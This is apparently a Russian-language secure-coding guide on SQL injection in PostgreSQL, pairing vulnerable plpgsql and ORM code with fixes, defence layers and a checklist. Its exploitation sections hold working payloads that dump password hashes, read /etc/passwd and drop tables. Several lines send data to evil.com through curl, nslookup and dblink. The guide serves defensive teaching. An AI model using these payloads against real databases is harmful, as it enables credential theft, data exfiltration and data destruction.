# SQL-инъекции в PostgreSQL

> **Содержание**
> 1. [Что такое SQLi](#что-такое-sqli)
> 2. [Типы SQLi в PostgreSQL](#типы-sqli)
> 3. [Вектор: динамический SQL в plpgsql](#plpgsql-dynamic)
> 4. [Вектор: ORM и query builders](#orm)
> 5. [Вектор: IDENTIFIERS (имена таблиц/колонок)](#identifiers)
> 6. [Вектор: ORDER BY / LIMIT](#order-by)
> 7. [Вектор: COPY и file_path](#copy-injection)
> 8. [Эксплуатация: UNION-based](#union-based)
> 9. [Эксплуатация: Boolean-based blind](#boolean-blind)
> 10. [Эксплуатация: Time-based blind](#time-blind)
> 11. [Эксплуатация: Error-based](#error-based)
> 12. [Эксплуатация: Out-of-band (OOB)](#oob)
> 13. [PostgreSQL-specific функции для эксплуатации](#exploit-functions)
> 14. [Защита: параметризация](#parameterized)
> 15. [Защита: defence in depth](#defence-depth)
> 16. [Чеклист](#чеклист)

---

## Что такое SQLi

SQL-инъекция (SQLi, CWE-89) — когда пользовательский ввод попадает в
SQL-запрос как код, а не как данные. Это позволяет атакующему изменить
семантику запроса.

PostgreSQL особенно опасен при SQLi, потому что:
1. Много встроенных функций (`pg_read_file`, `lo_import`, `COPY PROGRAM`).
2. Расширения (`plpythonu`, `dblink`) дают RCE/SSRF.
3. Выразительный синтаксис ( dollars-quoting `$$`, `RETURNING`, CTE) — много
   мест для инъекций.

OWASP Top 10: SQLi стабильно в топ-3 уже 20 лет.

---

## Типы SQLi

1. **In-band** — ответ атакующий получает в том же канале (тело ответа).
   - UNION-based: `?id=1 UNION SELECT password FROM users`
   - Error-based: `?id=1 AND 1=CAST((SELECT version()) AS int)` — ошибка
     содержит данные.
2. **Inferential (blind)** — ответ не содержит данных, но атакующий делает
   выводы по поведению.
   - Boolean-based: `?id=1 AND substring((SELECT password),1,1)='a'` —
     разные ответы.
   - Time-based: `?id=1; SELECT pg_sleep(5)` — задержка = TRUE.
3. **Out-of-band** — данные эксфильтрируются через другой канал.
   - DNS: `?id=1; COPY (SELECT password) TO PROGRAM 'nslookup $(pg_read_file(...)) evil.com'`

---

## plpgsql

PL/pgSQL — встроенный процедурный язык. Динамический SQL через `EXECUTE` —
главный источник SQLi в stored procedures.

### Анти-пример 1: конкатенация строк

```sql
CREATE FUNCTION get_user_by_email(p_email text) RETURNS setof users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE email = ''' || p_email || '''';
END;
$$ LANGUAGE plpgsql;
```

Атакующий вызывает:
```sql
SELECT * FROM get_user_by_email('x'' OR ''1''=''1');
-- SQL становится: SELECT * FROM users WHERE email = 'x' OR '1'='1'
-- Возвращает всех пользователей
```

**Патч**: параметризация через `USING`:
```sql
CREATE FUNCTION get_user_by_email(p_email text) RETURNS setof users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE email = $1'
    USING p_email;
END;
$$ LANGUAGE plpgsql;
```

`$1` — placeholder, значение подставляется как data, не как код. SQLi
невозможен.

### Анти-пример 2: filter builder

```sql
CREATE FUNCTION search_users(p_filter text) RETURNS setof users AS $$
BEGIN
  RETURN QUERY EXECUTE 'SELECT * FROM users WHERE ' || p_filter;
END;
$$ LANGUAGE plpgsql;
```

Приложение формирует `p_filter` конкатенацией:
```python
filter_clause = f"name LIKE '%{user_input}%'"
cursor.callproc('search_users', (filter_clause,))
```

Это SQLi: атакующий вводит `'; DROP TABLE users; --` → filter становится
`name LIKE '%'; DROP TABLE users; --%'`.

**Патч**: приложение передаёт параметры отдельно:
```python
# Плохо:
filter_clause = f"name LIKE '%{user_input}%'"
cursor.callproc('search_users', (filter_clause,))

# Хорошо:
cursor.execute("SELECT * FROM users WHERE name LIKE %s", (f"%{user_input}%",))
```

Если нужен динамический фильтр — белый список колонок:
```python
ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
column = user_input_column
if column not in ALLOWED_COLUMNS:
    raise ValueError("Invalid column")
# Подставлять можно — это identifier, проверенный по белому списку
cursor.execute(f"SELECT * FROM users WHERE {column} LIKE %s", (f"%{user_value}%",))
```

### Анти-пример 3: динамический IDENTIFIER

```sql
CREATE FUNCTION get_column(p_table text, p_column text) RETURNS text AS $$
DECLARE
  result text;
BEGIN
  EXECUTE format('SELECT %I FROM %s LIMIT 1', p_column, p_table) INTO result;
  RETURN result;
END;
$$ LANGUAGE plpgsql;
```

`%I` экранирует identifier (ставит двойные кавычки). Но `%s` — НЕ экранирует.

Атакующий:
```sql
SELECT get_column('users; DROP TABLE orders; --', 'email');
-- SQL: SELECT "email" FROM users; DROP TABLE orders; -- LIMIT 1
```

**Патч**:
```sql
EXECUTE format('SELECT %I FROM %I LIMIT 1', p_column, p_table) INTO result;
```

`%I` для всех identifier-ов. Но даже `%I` не защищает от того, что
атакующий может указать имя любой таблицы — нужно проверять по белому
списку:
```sql
IF p_table NOT IN ('users', 'orders', 'products') THEN
  RAISE EXCEPTION 'Invalid table';
END IF;
```

---

## ORM

ORM не спасают от SQLi автоматически. Все ORM имеют escape-hatch для
raw SQL.

### SQLAlchemy (Python)

```python
# Плохо (SQLi):
session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))

# Хорошо (параметризация):
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})

# Плохо (SQLi через f-string):
session.query(User).filter(f"User.name LIKE '%{user_input}%'")

# Хорошо:
session.query(User).filter(User.name.like(f"%{user_input}%"))
# ORM-методы экранируют автоматически

# Опасно (raw SQL в hybrid_property):
@hybrid_property
def full_name(self):
    return self.first_name + ' ' + self.last_name

@full_name.expression
def full_name(cls):
    # Если бы тут была f-string с пользовательским вводом — SQLi
    return cls.first_name + ' ' + cls.last_name
```

### Django ORM (Python)

```python
# Плохо (SQLi):
User.objects.raw(f"SELECT * FROM users WHERE name = '{user_input}'")

# Хорошо:
User.objects.raw("SELECT * FROM users WHERE name = %s", [user_input])

# Плохо (extra с f-string):
User.objects.extra(where=[f"name = '{user_input}'"])

# Хорошо:
User.objects.filter(name=user_input)

# Опасно: RawSQL с f-string
from django.db.models.expressions import RawSQL
User.objects.annotate(val=RawSQL(f"name = '{user_input}'", []))  # SQLi!

# Хорошо:
User.objects.annotate(val=RawSQL("name = %s", [user_input]))
```

### Prisma (Node.js)

```typescript
// Prisma автоматически параметризует:
await prisma.user.findMany({ where: { name: userInput } });  // OK

// Но $queryRaw уязвим:
await prisma.$queryRaw`SELECT * FROM users WHERE name = '${userInput}'`;  // SQLi!

// Правильно:
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${userInput}`;  // Параметризуется
// С tagged template literals Prisma безопасна
```

### Hibernate (Java)

```java
// Плохо (HQL с конкатенацией):
Query q = session.createQuery("from User where name = '" + userInput + "'");

// Хорошо (параметры):
Query q = session.createQuery("from User where name = :name");
q.setParameter("name", userInput);

// Плохо (Native SQL):
Query q = session.createNativeQuery("SELECT * FROM users WHERE name = '" + userInput + "'");

// Хорошо:
Query q = session.createNativeQuery("SELECT * FROM users WHERE name = :name");
q.setParameter("name", userInput);

// Опасно: JPA @Query с SpEL:
@Query("SELECT u FROM User u WHERE u.name = ?#{userInput}")  // SpEL, НЕ параметр!
```

---

## IDENTIFIERS

Identifier-ы (имена таблиц, колонок, схем) нельзя параметризовать через
prepared statement. Только значения (data).

### Уязвимость

```python
# Сортировка по пользовательской колонке:
sort_col = request.args.get('sort', 'name')
cursor.execute(f"SELECT * FROM users ORDER BY {sort_col}")
# Если sort_col = 'name; DROP TABLE users' — SQLi
```

### Защита

**Только белый список**:

```python
ALLOWED_SORT_COLUMNS = {'name', 'email', 'created_at', 'updated_at'}
sort_col = request.args.get('sort', 'name')
if sort_col.lstrip('-') not in ALLOWED_SORT_COLUMNS:
    raise ValueError("Invalid sort column")
cursor.execute(f"SELECT * FROM users ORDER BY {sort_col}")
```

Или через `quote_ident`:
```python
# psycopg2:
from psycopg2.sql import SQL, Identifier
query = SQL("SELECT * FROM users ORDER BY {}").format(Identifier(sort_col))
cursor.execute(query)
# quote_ident ставит двойные кавычки, экранируя внутренние
# Но: если sort_col='name; DROP TABLE users', то это будет
# ORDER BY "name; DROP TABLE users" — что просто вызовет ошибку (нет такой колонки)
# Это безопасно, но непредсказуемо. Белый список лучше.
```

---

## ORDER BY

### Уязвимость

`ORDER BY` принимает:
1. Имя колонки.
2. Номер колонки (`ORDER BY 1`).
3. Выражение (`ORDER BY random()`, `ORDER BY (SELECT ...)`).

```sql
-- Сортировка по выражению — подзапрос:
SELECT * FROM users ORDER BY (SELECT CASE WHEN (SELECT password FROM users WHERE id=1)='secret' THEN 1 ELSE 1/0 END);
-- Если пароль='secret' — ORDER BY 1, иначе 1/0 = ошибка (boolean-based blind)
```

Атакующий в `?sort=` параметре:
```
?sort=(SELECT CASE WHEN (substring((SELECT password FROM users WHERE id=1),1,1)='a') THEN 1 ELSE 1/0 END)
```

Это позволяет извлекать данные по одному символу через ошибки.

### Защита

1. **Только белый список колонок** (как выше).
2. Если нужна сортировка по выражению — приложение формирует выражение
   само, не доверяя пользовательскому вводу.

---

## COPY

```python
# Анти-пример:
filename = request.args.get('file')
cursor.execute(f"COPY raw_logs FROM '{filename}' WITH (format csv)")
# Если filename = '/etc/passwd\'; DROP TABLE raw_logs; --' — SQLi
```

**Патч**:
```python
# Параметризация:
cursor.execute("COPY raw_logs FROM %s WITH (format csv)", (filename,))
# Но: COPY не поддерживает параметры напрямую!
# Используйте:
from psycopg2.sql import SQL, Literal
query = SQL("COPY raw_logs FROM {} WITH (format csv)").format(Literal(filename))
cursor.execute(query)
# Literal экранирует строку
```

Лучше — приложение контролирует имя файла полностью:
```python
ALLOWED_DIRECTORIES = ['/var/log/app/', '/data/imports/']
filepath = os.path.normpath(filename)
if not any(filepath.startswith(d) for d in ALLOWED_DIRECTORIES):
    raise ValueError("Invalid file path")
```

---

## UNION-based

### Эксплуатация

Допустим, в приложении:
```python
cursor.execute(f"SELECT id, name FROM users WHERE id = {user_input}")
# user_input = '1 UNION SELECT username, password FROM pg_shadow --'
```

```sql
-- Результирующий SQL:
SELECT id, name FROM users WHERE id = 1 UNION SELECT username, password FROM pg_shadow -- 
-- Возвращает: id, name пользователей + username, password из pg_shadow
```

### Что можно извлечь

```sql
-- Версия:
SELECT NULL, version()

-- Список БД:
SELECT NULL, string_agg(datname, ', ') FROM pg_database

-- Список таблиц в текущей БД:
SELECT NULL, string_agg(tablename, ', ') FROM pg_tables WHERE schemaname='public'

-- Список колонок:
SELECT NULL, string_agg(column_name, ', ') FROM information_schema.columns WHERE table_name='users'

-- Содержимое таблицы:
SELECT NULL, string_agg(username||':'||password_hash, chr(10)) FROM users

-- Пароли (pg_shadow):
SELECT usename, passwd FROM pg_shadow

-- Чтение файла:
SELECT NULL, pg_read_file('/etc/passwd')
```

### Определение количества колонок

```sql
-- Метод 1: ORDER BY с инкрементом
?id=1 ORDER BY 1 -- OK
?id=1 ORDER BY 2 -- OK
?id=1 ORDER BY 3 -- OK
?id=1 ORDER BY 4 -- ERROR → 3 колонки

-- Метод 2: UNION с NULL
?id=1 UNION SELECT NULL -- ERROR (different column count)
?id=1 UNION SELECT NULL, NULL -- ERROR
?id=1 UNION SELECT NULL, NULL, NULL -- OK → 3 колонки
```

---

## Boolean-based blind

Когда приложение не возвращает данные, но ведёт себя по-разному в
зависимости от TRUE/FALSE.

### Эксплуатация

```sql
-- TRUE:
?id=1 AND 1=1 -- возвращает пользователя с id=1

-- FALSE:
?id=1 AND 1=2 -- возвращает пустой результат

-- Извлечение данных по одному биту:
?id=1 AND (SELECT length(password) FROM users WHERE id=1) > 5
-- Если вернуло пользователя — длина > 5
?id=1 AND (SELECT length(password) FROM users WHERE id=1) > 10
-- Если пусто — длина <= 10
-- Бинарный поиск → точная длина

-- Дальше — посимвольно:
?id=1 AND ascii(substring((SELECT password FROM users WHERE id=1), 1, 1)) > 100
-- Если вернуло — код первого символа > 100
-- Бинарный поиск за ~7 запросов на символ
```

### Инструменты

- **sqlmap**: `sqlmap -u "http://target.com/?id=1" --dbs --threads=4`
- **BBQSql**: ручной
- **Burp Suite Intruder**: для разработки собственной логики

### Защита

Только параметризация. Никакая фильтрация кавычек, никакие regex на
`UNION`/`SELECT` — обходятся кодировками (`UN/**/ION`), case-вариациями
(`UnIoN`), комментариями (`UN/**/ION`).

---

## Time-based blind

Когда нет разницы в ответе, но можно вызвать задержку.

### Эксплуатация

```sql
-- Простая задержка:
?id=1; SELECT pg_sleep(5) -- 
-- Ответ через 5 секунд

-- Условная задержка:
?id=1 AND (SELECT CASE WHEN (SELECT password FROM users WHERE id=1)='secret' THEN pg_sleep(5) ELSE pg_sleep(0) END)='x'
-- Если пароль='secret' — ответ через 5 сек, иначе сразу

-- Побитово:
?id=1 AND (SELECT CASE WHEN (ascii(substring((SELECT password FROM users WHERE id=1), 1, 1)) & 1)=1 THEN pg_sleep(3) ELSE 1 END)='x'
-- Проверяет первый бит первого символа
```

### Защита

Параметризация. Также — мониторинг медленных запросов (PgBouncer,
pg_stat_statements) для обнаружения атак.

---

## Error-based

PostgreSQL ошибки содержат много информации. Можно вызвать ошибку,
содержащую данные.

### Эксплуатация

```sql
-- CAST к int несуществующего значения:
?id=1 AND 1=CAST((SELECT version()) AS int)
-- ERROR: invalid input syntax for type integer: "PostgreSQL 15.4 on x86_64-pc-linux-gnu..."
-- Ошибка содержит version()

-- dblink_error_message:
?id=1 AND dblink_error_message('conn', (SELECT password FROM users WHERE id=1)) IS NOT NULL

-- format():
?id=1 AND format('%s', (SELECT password FROM users WHERE id=1))=''
-- Если format не используется — ошибка содержит формат-строку
```

### Защита

1. Параметризация.
2. Не показывать детали ошибок пользователю. Логировать отдельно:
   ```python
   try:
       cursor.execute(...)
   except psycopg2.Error as e:
       logger.error(f"DB error: {e}")
       return "Internal error", 500  # НЕ e.diag.message_primary
   ```

---

## OOB

Out-of-band — данные эксфильтрируются через другой канал (DNS, HTTP).

### Эксплуатация

```sql
-- Через COPY PROGRAM (нужен SUPERUSER):
?id=1; COPY (SELECT password FROM users WHERE id=1) TO PROGRAM 'curl -d @- http://evil.com/collect' --

-- Через dblink (если установлен):
?id=1; SELECT dblink('host=evil.com port=5432 dbname=leak user='||(SELECT password FROM users WHERE id=1), 'SELECT 1') --

-- Через large objects + lo_export (нужен SUPERUSER или REVOKE не сделан):
?id=1; SELECT lo_export(lo_import('/etc/passwd'), '/tmp/p') --
-- Потом через COPY PROGRAM:
?id=1; COPY (SELECT 1) TO PROGRAM 'curl -d @/tmp/p http://evil.com' --

-- DNS exfil (через COPY PROGRAM):
?id=1; COPY (SELECT 1) TO PROGRAM 'nslookup $(cat /etc/passwd | head -1).evil.com' --
-- Логи DNS на evil.com покажут запрос, содержащий данные
```

### Защита

1. `REVOKE` на все функции (см. filesystem_os.md).
2. Сетевая изоляция (egress firewall).
3. DNS-мониторинг (Suricata / Zeek — детекция DGA-like запросов).

---

## Exploit-функции

PostgreSQL имеет много функций, полезных для эксплуатации SQLi:

| Функция | Что делает | Полезно для |
|---------|------------|-------------|
| `version()` | Версия PostgreSQL | Fingerprinting |
| `current_user` | Текущий пользователь | Privilege check |
| `current_database()` | Текущая БД | Reconnaissance |
| `current_setting('search_path')` | search_path | Identifier injection |
| `pg_read_file(text)` | Чтение файла | File disclosure |
| `pg_read_binary_file(text)` | Чтение бинарного файла | Binary exfil |
| `pg_ls_dir(text)` | Листинг директории | Recon |
| `lo_import(text)` | Импорт файла в large object | File → DB |
| `lo_export(oid, text)` | Экспорт LO в файл | DB → file |
| `dblink(text, text)` | SQL к другому серверу | SSRF / lateral |
| `pg_sleep(float)` | Задержка | Time-based blind |
| `gen_random_bytes(int)` | Случайные байты | Token generation |
| `pg_stat_file(text)` | Статистика файла | Recon |
| `string_agg(col, sep)` | Конкатенация строк | Aggregate exfil |
| `regexp_match(text, text)` | Regex-матч | Boolean blind |

### Полезные системные каталоги

```sql
-- Все пользователи:
SELECT usename, passwd FROM pg_shadow;  -- суперпользователь
SELECT rolname, rolpassword FROM pg_authid;  -- суперпользователь

-- Список таблиц:
SELECT tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog', 'information_schema');
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Колонки:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';

-- Размер таблиц:
SELECT schemaname, relname, pg_size_pretty(pg_total_relation_size(relid))
FROM pg_catalog.pg_statio_user_tables;

-- Активные подключения:
SELECT datname, usename, application_name, client_addr, query
FROM pg_stat_activity;
```

---

## Параметризация

### psycopg2 / psycopg3 (Python)

```python
# Параметризация (безопасно):
cursor.execute("SELECT * FROM users WHERE id = %s AND name = %s", (user_id, user_name))
# %s — placeholder. Значения экранируются.

# Named (тоже безопасно):
cursor.execute("SELECT * FROM users WHERE id = %(id)s AND name = %(name)s",
               {"id": user_id, "name": user_name})

# Опасно:
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")  # SQLi!
cursor.execute("SELECT * FROM users WHERE id = " + str(user_id))  # SQLi!
```

### SQL builder для identifiers

```python
from psycopg2.sql import SQL, Identifier, Literal

# Identifier (имя колонки/таблицы):
query = SQL("SELECT * FROM {} WHERE {} = {}").format(
    Identifier('users'),
    Identifier('name'),
    Literal('Alice')
)
cursor.execute(query)
# SELECT * FROM "users" WHERE "name" = 'Alice'

# Динамический ORDER BY:
sort_col = request.args.get('sort', 'name')
if sort_col.lstrip('-') not in ALLOWED_SORT_COLUMNS:
    raise ValueError("Invalid sort column")
direction = 'DESC' if sort_col.startswith('-') else 'ASC'
column = sort_col.lstrip('-')
query = SQL("SELECT * FROM users ORDER BY {} " + direction).format(Identifier(column))
cursor.execute(query)
```

### Другие драйверы

| Драйвер | Placeholder | Пример |
|---------|-------------|--------|
| psycopg2 | `%s` | `cur.execute("... WHERE x = %s", (v,))` |
| psycopg3 | `%s` | `cur.execute("... WHERE x = %s", (v,))` |
| asyncpg | `$1`, `$2` | `await conn.execute("... WHERE x = $1", v)` |
| node-postgres | `$1` | `client.query("... WHERE x = $1", [v])` |
| JDBC | `?` | `ps.setString(1, v)` |
| .NET Npgsql | `@p1` | `cmd.Parameters.AddWithValue("p1", v)` |

---

## Defence in depth

Параметризация — необходимое, но не достаточное. Дополнительные слои:

### 1. Principle of least privilege

Приложение с SQLi и правами `SELECT` на одной таблице — гораздо менее
опасно, чем с SUPERUSER.

```sql
CREATE ROLE app_readonly LOGIN PASSWORD '...';
GRANT CONNECT ON DATABASE app_db TO app_readonly;
GRANT USAGE ON SCHEMA app_schema TO app_readonly;
GRANT SELECT ON app_schema.users TO app_readonly;
-- Только SELECT на конкретные таблицы. REVOKE ALL на остальные.
```

### 2. RLS

Даже при SQLi на `SELECT * FROM users WHERE id = ?`, RLS ограничит, какие
строки видит приложение:

```sql
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
CREATE POLICY users_tenant ON users
  FOR SELECT
  USING (tenant_id = current_setting('app.tenant_id')::int);
-- Атакующий через SQLi не увидит чужие tenants
```

### 3. WAF

Web Application Firewall может обнаружить SQLi-паттерны. Не панацея, но
дополнительный слой.

ModSecurity с OWASP CRS:
```
SecRuleEngine On
Include /etc/modsecurity/owasp-crs/crs-setup.conf
Include /etc/modsecurity/owasp-crs/rules/*.conf
```

### 4. SQL-логирование и аномалии

```sql
-- pg_stat_statements:
SELECT query, calls, total_exec_time, mean_exec_time
FROM pg_stat_statements
ORDER BY total_exec_time DESC LIMIT 20;
-- Аномально много запросов с одним шаблоном = bot/SQLi

-- pgAudit логирует все запросы с параметрами
```

### 5. SAST/DAST

- **SAST** (static): `bandit` (Python), `semgrep` (multi-language),
  `CodeQL`. Ищут `cursor.execute(f"...{user_input}...")`.
- **DAST** (dynamic): `sqlmap`, `Burp Suite`. Тестируют через HTTP.

---

## Чеклист

- [ ] Все SQL-запросы используют параметризацию (`%s`, `$1`, `?`).
- [ ] Нет конкатенации строк для формирования SQL.
- [ ] Нет `f"...{user_input}..."` в SQL.
- [ ] Идентификаторы (имена колонок) — через белый список или `Identifier()`.
- [ ] Динамический SQL в plpgsql — через `EXECUTE ... USING`.
- [ ] `format()` использует `%I` для всех identifier-ов.
- [ ] ORM raw-запросы проаудированы (`text(f"...")`, `extra(where=...)`).
- [ ] Приложение имеет минимальные права (не SUPERUSER).
- [ ] RLS включён на критичных таблицах.
- [ ] WAF активен (ModSecurity с OWASP CRS).
- [ ] pgAudit логирует все запросы с параметрами.
- [ ] SAST в CI (semgrep / bandit).
- [ ] DAST в staging (sqlmap).
- [ ] Ошибки БД не показываются пользователю (логируются отдельно).
- [ ] `pg_stat_statements` мониторится на аномалии.
- [ ] Сетевая изоляция: приложение → БД только через pgBouncer с audit.
